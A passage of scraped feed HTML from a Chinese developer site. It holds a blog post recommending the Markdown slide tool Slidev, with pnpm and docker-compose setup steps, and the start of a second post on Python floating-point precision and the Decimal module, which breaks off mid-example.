                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近我在逛GitHub时，发现了一个很有意思的项目——<code>Slidev</code>。如果用一句话来总结，那就是：</p>
<blockquote>
<p>用 Markdown 写幻灯片，让技术分享更高效、更优雅。</p>
</blockquote>
<p>今天就来给大家推荐一下这个项目。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b63822bc6674c2883c3b918ed87bf26~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770911908&amp;x-signature=OJVUC1gRgVxXe9%2BA7Sz6k679TFU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">❓为什么选择 Slidev？</h2>
<p>作为开发者，我们经常需要做技术分享、产品演示或会议报告。传统的演示工具（如 PowerPoint、Keynote）虽然功能强大，但对于代码展示和实时编程演示往往力不从心。这就是 Slidev 诞生的原因——专为开发者设计的演示文稿工具。</p>
<p>Slidev（Slide + dev）结合了 Markdown 的简洁性和现代 Web 技术的强大功能，让你能够：</p>
<ul>
<li>• 🎯 <strong>专注于内容</strong>，而不是样式调整</li>
<li>• 💻 <strong>优雅地展示代码</strong>，支持实时编辑</li>
<li>• 🚀 <strong>快速启动和迭代</strong>，享受即时热重载</li>
</ul>
<p>github地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fslidevjs%2Fslidev" target="_blank" title="https://github.com/slidevjs/slidev" ref="nofollow noopener noreferrer">github.com/slidevjs/sl…</a></p>
<p>在线地址： <a href="https://link.juejin.cn?target=https%3A%2F%2Fsli.dev%2Fnew" target="_blank" title="https://sli.dev/new" ref="nofollow noopener noreferrer">sli.dev/new</a></p>
<p>中文文档地址: <a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.sli.dev%2F" target="_blank" title="https://cn.sli.dev/" ref="nofollow noopener noreferrer">cn.sli.dev/</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/136dae14f45b4b089e082ee5b76cb0ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770911908&amp;x-signature=rJ9Epyw6LdQs%2BXne7ZVfwuIafo8%3D" alt="1ef49745429949901c8720855a0f1c37.png" loading="lazy"/></p>
<p>该项目目前在github上已有<strong>44.1k</strong> ⭐️star</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4f3ac5c3093486798b04ca70b58eb5f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770911908&amp;x-signature=bQKqvwuM6HMUqy7aFBXNzVzJq88%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">🎯核心特性一览</h2>
<h3 data-id="heading-2">📝 Markdown 驱动</h3>
<p>用你熟悉的 Markdown 语法编写幻灯片，所有内容都在纯文本文件中，易于版本控制。</p>
<h3 data-id="heading-3">🧑‍💻 开发者友好功能</h3>
<ul>
<li>• <strong>代码高亮</strong>：内置语法高亮，支持多种编程语言</li>
<li>• <strong>实时编程</strong>：在演示过程中直接编辑和运行代码</li>
<li>• <strong>终端模拟</strong>：展示命令行操作的真实效果</li>
</ul>
<h3 data-id="heading-4">🎨 强大的样式和主题系统</h3>
<ul>
<li>• <strong>主题库丰富</strong>：从官方和社区主题中选择，或轻松创建自己的主题</li>
<li>• <strong>UnoCSS 集成</strong>：使用原子化 CSS 工具快速定制样式</li>
<li>• <strong>响应式设计</strong>：自适应不同屏幕尺寸</li>
</ul>
<h3 data-id="heading-5">🤹 交互式元素</h3>
<ul>
<li>• <strong>嵌入 Vue 组件</strong>：无缝集成交互式组件</li>
<li>• <strong>动态内容</strong>：在幻灯片中使用响应式数据</li>
<li>• <strong>自定义布局</strong>：创建复杂的幻灯片结构</li>
</ul>
<h3 data-id="heading-6">🎙 专业演示功能</h3>
<ul>
<li>• <strong>演讲者模式</strong>：在单独窗口查看笔记和计时器</li>
<li>• <strong>远程控制</strong>：使用手机或其他设备控制幻灯片</li>
<li>• <strong>画板功能</strong>：在幻灯片上实时绘制和标注</li>
<li>• <strong>录制功能</strong>：内置录制和摄像头视图</li>
</ul>
<h3 data-id="heading-7">📚 技术文档友好</h3>
<ul>
<li>• <strong>LaTeX 支持</strong>：完美的数学公式渲染</li>
<li>• <strong>Mermaid 图表</strong>：用文本描述创建流程图、序列图等</li>
<li>• <strong>图标系统</strong>：直接访问数千个图标</li>
</ul>
<h2 data-id="heading-8">⚡快速开始</h2>
<h3 data-id="heading-9">🌐在线体验</h3>
<p>无需安装，直接在浏览器中体验：<a href="https://link.juejin.cn?target=https%3A%2F%2Fsli.dev%2Fnew" title="https://sli.dev/new" target="_blank" ref="nofollow noopener noreferrer">sli.dev/new</a></p>
<h3 data-id="heading-10">🖥️本地安装</h3>
<p>确保已安装 Node.js (&gt;=18)，然后运行：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 如果你还没有安装 pnpm</span>
npm i -g pnpm

pnpm create slidev

<span class="hljs-comment"># 如果你希望使用单个 Markdown 文件作为幻灯片，可以全局安装 Slidev CLI：</span>

pnpm i -g @slidev/cli

<span class="hljs-comment"># 通过以下命令创建并启动幻灯片:</span>

slidev slides.md
</code></pre>
<h3 data-id="heading-11">🐳Docker 安装</h3>
<p>如果你需要快速的在容器上部署你的演示文稿，你可以使用由 tangramor 维护的预构建 docker 镜像。</p>
<p>github地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftangramor%2Fslidev_docker" target="_blank" title="https://github.com/tangramor/slidev_docker" ref="nofollow noopener noreferrer">github.com/tangramor/s…</a></p>
<p>我使用的是docker-compose启动的，以下是操作步骤</p>
<p>创建docker-compose.yml文件</p>
<pre><code class="hljs language-bash" lang="bash">services:
  slidev:
    image: tangramor/slidev:latest
    container_name: slidev
    user: <span class="hljs-string">"node"</span>
    ports:
      - <span class="hljs-string">"3030:3030"</span>
    environment:
      - NPM_MIRROR=https://registry.npmmirror.com
    volumes:
      - ./data:/slidev
    stdin_open: <span class="hljs-literal">true</span>
    <span class="hljs-built_in">tty</span>: <span class="hljs-literal">true</span>
</code></pre>
<p>在docker-compose.yml同级目录下创建挂载目录并授权</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建挂载目录</span>
<span class="hljs-built_in">mkdir</span> data
<span class="hljs-comment"># 授权</span>
sudo <span class="hljs-built_in">chmod</span> -R 777 ./data
</code></pre>
<p>启动容器</p>
<pre><code class="hljs">docker-compose up -d 
</code></pre>
<p>查看日志</p>
<pre><code class="hljs">docker-compose logs -f 
</code></pre>
<p>如出现以下日志，则说明容器启动成功</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e45bbef97f1465a97ecb21491e3ebe4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770911908&amp;x-signature=z3XvC8UdT9FQQrcDJuUEFAWYnBE%3D" alt="" loading="lazy"/></p>
<p>启动完成后我们在浏览器中打开地址</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/815ca6dd1087469f9afd8f13b21873f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770911908&amp;x-signature=Xzv29Gh1ssEJJS2OtxK5RpmK0l8%3D" alt="c5caaa4783416644789f66c5e2f57a98.png" loading="lazy"/></p>
<p>在页面上右击则可以看到操作选项</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d71db3acba74f4bbee8ea86469d434d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770911908&amp;x-signature=uGFzTUXk8L%2FYKNE%2BeJX0JQyJj9g%3D" alt="" loading="lazy"/></p>
<p><code>show editor</code> -&gt;编辑md内容</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f55fadf9e6d4970b32e332fb51570b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770911908&amp;x-signature=ol2u7qoR8CPxgvf1bEig1C%2B0J6I%3D" alt="" loading="lazy"/></p>
<p><code>Shitf</code>+<code>右击</code> 打开本地功能</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a3742df90ec45dc8eac477b1ac90457~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770911908&amp;x-signature=Z5pZjlVe0f96512eSn1Kyuqjico%3D" alt="6580fc5817737eef4a9027ce9148c9a9.png" loading="lazy"/></p>
<p>其它以下语法，操作我们就不在此处介绍了，家人们自行尝试吧</p>
<h2 data-id="heading-12">🧩 生态系统</h2>
<p>Slidev 拥有活跃的社区和丰富的资源：</p>
<ul>
<li>• <strong>官方文档</strong>：多语言支持（中、英、法、西、俄、葡）</li>
<li>• <strong>主题画廊</strong>：大量现成主题可供选择</li>
<li>• <strong>插件系统</strong>：扩展 Slidev 的功能</li>
<li>• <strong>VS Code 扩展</strong>：提供更好的编辑体验</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cf66b0801f747c3847ec77435e03984~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770911908&amp;x-signature=WImRIsWJ3p3C483Jo4BJAWsLEBE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-13">📝结语</h2>
<p>无论你是需要做一次技术分享，还是想要创建教学材料，Slidev 都能提供卓越的体验。它的设计理念完美契合开发者的思维方式：</p>
<ol>
<li>1. <strong>从简单开始</strong>：用 Markdown 快速创建基础幻灯片</li>
<li>2. <strong>专注于内容</strong>：让工具处理样式和布局问题</li>
<li>3. <strong>优雅演示</strong>：享受流畅的演示体验和专业的外观</li>
</ol>
<p>Slidev 不仅是一个工具，更是一种新的演示文稿创作哲学——将内容的简洁性和功能的强大性完美结合。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python 浮点数陷阱详解：如何完美解决 x * 0.1 的精度问题]]></title>    <link>https://juejin.cn/post/7603252259560177700</link>    <guid>https://juejin.cn/post/7603252259560177700</guid>    <pubDate>2026-02-05T14:17:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603252259560177700" data-draft-id="7603030564837081142" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python 浮点数陷阱详解：如何完美解决 x * 0.1 的精度问题"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-02-05T14:17:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python 浮点数陷阱详解：如何完美解决 x * 0.1 的精度问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T14:17:22.000Z" title="Thu Feb 05 2026 14:17:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">1. 现象： 为什么读到的温度计数据小数位有那么多？</h3>
<p>刚到了一个温湿度传感器，我就把他接入到八哥开关小帮手上面。
数据是通过Modbus-RTU的协议传输到服务器上，是一个整型 int16AB 编码，刚好是10倍的关系，
计算公式为 value = 0.1 * read_value。
计算出来的数据很奇怪，18.9000000000002，后面多出来了好多的小数点，用眼睛看就知道有问题了。
我们希望的是得到 18.9，但计算机给出了一个带有微小“尾巴”的数字。这并不是 Python 的 bug，而是计算机底层存储浮点数方式导致的物理限制。</p>
<h3 data-id="heading-1">2. 原理：二进制的世界没有 0.1</h3>
<p>计算机使用 <strong>IEEE 754 标准</strong> 的二进制浮点数来存储小数。</p>
<p>在十进制中，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>3</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span> 是无限循环小数 (<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.3333...</mn></mrow><annotation encoding="application/x-tex">0.3333...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.3333...</span></span></span></span></span>)；同理，在二进制中，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>10</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{10}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span> (即 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.1</mn></mrow><annotation encoding="application/x-tex">0.1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.1</span></span></span></span></span>) 也是一个无限循环小数：</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.</mn><msub><mn>1</mn><mrow><mo stretchy="false">(</mo><mn>10</mn><mo stretchy="false">)</mo></mrow></msub><mo>=</mo><mn>0.00011001100110011..</mn><msub><mi mathvariant="normal">.</mi><mrow><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></msub></mrow><annotation encoding="application/x-tex">0.1_{(10)} = 0.00011001100110011..._{(2)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9996em;vertical-align:-0.3552em;"/><span class="mord">0.</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">10</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.9996em;vertical-align:-0.3552em;"/><span class="mord">0.00011001100110011..</span><span class="mord"><span class="mord">.</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">2</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span/></span></span></span></span></span></span></span></span></span></p>
<p>因为计算机的存储空间（53位有效数字）是有限的，它必须在某一位进行<strong>截断</strong>。这种截断导致了微小的精度丢失，就像把 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.3333...</mn></mrow><annotation encoding="application/x-tex">0.3333...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.3333...</span></span></span></span></span> 截断为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.3333</mn></mrow><annotation encoding="application/x-tex">0.3333</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.3333</span></span></span></span></span> 一样，结果虽然极其接近，但在数学上并不完全相等。</p>
<h3 data-id="heading-2">3. 采用 decimal 金融级精确计算来解决</h3>
<p><code>Decimal</code> 模块模拟了人类手算的方式，避免了二进制转换误差，这样我们算出来的数据就不会出现那么多的小数位了。</p>
<p>Python</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">from</span> <span class="hljs-type">decimal</span> import <span class="hljs-type">Decimal</span>

# 核心原则：必须以 <span class="hljs-string">'字符串'</span> 形式初始化
a <span class="hljs-operator">=</span> <span class="hljs-type">Decimal</span>(<span class="hljs-string">'189'</span>)
